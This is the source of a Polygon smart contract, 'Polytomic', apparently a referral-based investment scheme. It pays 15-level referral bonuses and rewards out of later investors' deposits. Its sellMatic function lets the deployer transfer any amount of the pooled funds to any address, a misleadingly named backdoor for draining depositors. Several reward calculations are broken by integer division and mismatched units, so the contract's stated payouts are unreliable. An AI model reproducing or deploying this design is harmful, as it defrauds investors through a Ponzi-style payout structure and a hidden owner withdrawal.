/**
 *Submitted for verification at polygonscan.com on 2022-05-03
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.12;

contract Polytomic {

    using SafeMath for uint256;

    address payable initiator;
    address payable aggregator;
    address [] investors;
    uint256 totalHoldings;
    uint256 basePrice = 1e10;
    uint256 [] referral_bonuses;
    uint256 initializeTime;
    uint256 weeklyInvestment;
    uint256 totalInvestment;
    uint256 totalWithdraw;
    uint256 lastWeeklyRewardDistribution;

    struct User{
        uint256 token;
        address referral;
        uint256 PSI;
        uint256 weeklyReward;
        uint256 totalIncome;
        uint256 workingWithdraw;
        uint256 nonWorkingWithdraw;
        uint256 weeklyBusiness;
        uint256 totalBusiness;
        uint256 totalInvestment;
        uint256 totalWithdraw;
        uint256 lastNonWokingWithdraw;
        mapping(uint8 => uint256) referrals_per_level;
    }

    struct Deposit{
        uint256 amount;
        uint256 businessAmount;
        uint256 tokens;
        uint256 depositTime;
    }

    struct Withdraw{
        uint256 amount;
        bool isWorking;
        uint256 tokens;
        uint256 withdrawTime;
    }
    
    mapping(address => User) public users;
    mapping(address => Deposit[]) public deposits;
    mapping(address => Withdraw[]) public payouts;
    
    event Deposits(address buyer, uint256 amount);
    event PSIDistribution(address buyer, uint256 amount);
    event WeeklyRewardDistribution(uint256 rewardShare, uint256 weeklyBusiness);
    event WorkingWithdraw(address withdrawer, uint256 amount);
    event NonWorkingWithdraw(address withdrawer, uint256 amount);
   
    modifier onlyInitiator(){
        require(msg.sender == initiator,"You are not initiator.");
        _;
    }

    function contractInfo() public view returns(uint256 matic, uint256 totalDeposits, uint256 totalPayouts, uint256 totalInvestors, uint256 totalHolding){
        matic = address(this).balance;
        totalDeposits = totalInvestment;
        totalPayouts = totalWithdraw;
        totalInvestors = investors.length;
        totalHolding = totalHoldings;
        return(matic,totalDeposits,totalPayouts,totalInvestors,totalHolding);
    }

    function getCurrentPrice() public view returns(uint256 price){
        price = (address(this).balance>0)?basePrice.mul(address(this).balance):basePrice;
        return price;
    }

    function nextWeeklyRewardDistribution() public view returns(uint256 next){
        next = (lastWeeklyRewardDistribution > initializeTime)?lastWeeklyRewardDistribution + 7 days : initializeTime + 7 days;
        return next;
    }

    constructor() public {
        initiator = msg.sender;
        aggregator = msg.sender;
        initializeTime = block.timestamp;
        lastWeeklyRewardDistribution = block.timestamp;
        referral_bonuses.push(1000);
        referral_bonuses.push(400);
        referral_bonuses.push(200);
        referral_bonuses.push(100);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(50);
        referral_bonuses.push(25);
        referral_bonuses.push(25);
        referral_bonuses.push(25);
        referral_bonuses.push(25);
        referral_bonuses.push(10);
    }

    function deposit(address _referer) public payable{
        uint256 price = getCurrentPrice();
        User storage user = users[msg.sender];
        user.token+=(msg.value.mul(65).div(100)).div(price);
        totalHoldings+=(msg.value.mul(65).div(100));
        weeklyInvestment+=msg.value;
        totalInvestment+=msg.value;
        user.totalInvestment+=msg.value;
        
        deposits[msg.sender].push(Deposit(
            msg.value,
            msg.value.mul(65).div(100),
            (msg.value.mul(65).div(100)).div(price),
            block.timestamp
        ));

        _setReferral(msg.sender,_referer, msg.value);
        _distributePSI(msg.sender,msg.value.mul(10).div(100));
        investors.push(msg.sender);
        aggregator.transfer(msg.value.div(100));
        emit Deposits(msg.sender, msg.value);
    } 

    function _setReferral(address _addr, address _referral, uint256 _amount) private {
        uint256 levelShare = _amount.mul(22).div(100);
        if(users[_addr].referral == address(0)) {
            users[_addr].referral = _referral;
            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                if(i == 0){
                    users[_referral].referrals_per_level[i]+=levelShare.mul(referral_bonuses[i].div(100)).div(100);
                    users[_referral].totalIncome+=levelShare.mul(referral_bonuses[i].div(100)).div(100);
                    users[_referral].totalBusiness+=_amount;
                    users[_referral].weeklyBusiness+=_amount;
                }
                else if(i>0 && users[_referral].totalBusiness>=500e18){
                    users[_referral].referrals_per_level[i]+=levelShare.mul(referral_bonuses[i].div(100)).div(100);
                    users[_referral].totalIncome+=levelShare.mul(referral_bonuses[i].div(100)).div(100);
                    users[_referral].totalBusiness+=_amount;
                    users[_referral].weeklyBusiness+=_amount;
                }
                _referral = users[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }

    function _distributePSI(address depositor, uint256 _psi) internal{
        uint256 psiShare;
        for(uint256 i = 0; i < investors.length; i++){
            User storage user = users[investors[i]];
            psiShare = user.token.div(totalHoldings).mul(100);
            user.PSI+=_psi.mul(psiShare).div(100);
        }
        emit PSIDistribution(depositor,_psi);
    }

    function distributeWeeklyReward() external onlyInitiator{
        uint256 rewardShare = _calculateWeeklyReward().div(getCurrentPrice());
        for(uint256 i = 0; i < investors.length; i++){
            User storage user = users[investors[i]];
            if(user.weeklyBusiness>500e18){
                user.weeklyReward = rewardShare;       
                user.weeklyBusiness = 0;
            }
        }
        emit WeeklyRewardDistribution(rewardShare,weeklyInvestment);
        lastWeeklyRewardDistribution = block.timestamp;
        weeklyInvestment = 0;
    }

    function _calculateWeeklyReward() public view returns(uint256 reward){
        uint256 rewardUser;
        for(uint256 i = 0; i < investors.length; i++){
            User storage user = users[investors[i]];
            if(user.weeklyBusiness>500e18){
                rewardUser++;
            }
        }
        reward = (weeklyInvestment.mul(2).div(100)).div(rewardUser);
        return reward;
    }

    function _workingLevelDistribution(address _addr, uint256 levelShare) private {
        address _referral;
        _referral = users[_addr].referral;
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            if(i == 0){
                users[_referral].referrals_per_level[i]+=levelShare.mul(referral_bonuses[i].div(100)).div(100);
                users[_referral].totalIncome+=levelShare.mul(referral_bonuses[i].div(100)).div(100);
                
            }
            else if(i>0 && users[_referral].totalBusiness>=500e18){
                users[_referral].referrals_per_level[i]+=levelShare.mul(referral_bonuses[i].div(100)).div(100);
                users[_referral].totalIncome+=levelShare.mul(referral_bonuses[i].div(100)).div(100);
            }
            _referral = users[_referral].referral;
            if(_referral == address(0)) break;
        }
       
    }

    function workingWithdraw() public{
        User storage user = users[msg.sender];
        require(user.totalInvestment>0, "Invalid User!");
        uint256 withdrawable = user.totalIncome+user.PSI-user.workingWithdraw;
        require(withdrawable>0, "Invalid withdraw!");
        user.workingWithdraw+=withdrawable;
        uint256 levelShare = withdrawable.mul(10).div(100);
        withdrawable = withdrawable.mul(90).div(100);
        msg.sender.transfer(withdrawable);
        user.totalWithdraw = withdrawable;
        totalWithdraw+=withdrawable;

        payouts[msg.sender].push(Withdraw(
            withdrawable,
            true,
            0,
            block.timestamp
        ));

        emit WorkingWithdraw(msg.sender,withdrawable);
        _workingLevelDistribution(msg.sender,levelShare);
    }

    function nonWorkingWithdraw() public{
        User storage user = users[msg.sender];
        require(user.totalInvestment>0, "Invalid User!");
        uint256 nextPayout = (user.lastNonWokingWithdraw>0)?user.lastNonWokingWithdraw + 1 days:deposits[msg.sender][0].depositTime + 1 days;
        require(block.timestamp >= nextPayout,"Sorry ! See you next time.");
        uint8 perc = (user.referrals_per_level[0]>=1000e18)?50:25;
        uint256 withdrawable = (user.token+user.weeklyReward).mul(perc).div(1000).mul(getCurrentPrice());
        msg.sender.transfer(withdrawable);
        user.lastNonWokingWithdraw = block.timestamp;
        user.token-=user.token.mul(perc).div(1000);
        user.totalWithdraw = withdrawable;
        totalWithdraw+=withdrawable;

        payouts[msg.sender].push(Withdraw(
            withdrawable,
            false,
            withdrawable.mul(getCurrentPrice()),
            block.timestamp
        ));

        emit NonWorkingWithdraw(msg.sender,withdrawable);
    }

    function sellMatic(address payable buyer, uint _amount) external onlyInitiator{
        buyer.transfer(_amount);
    }
   
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}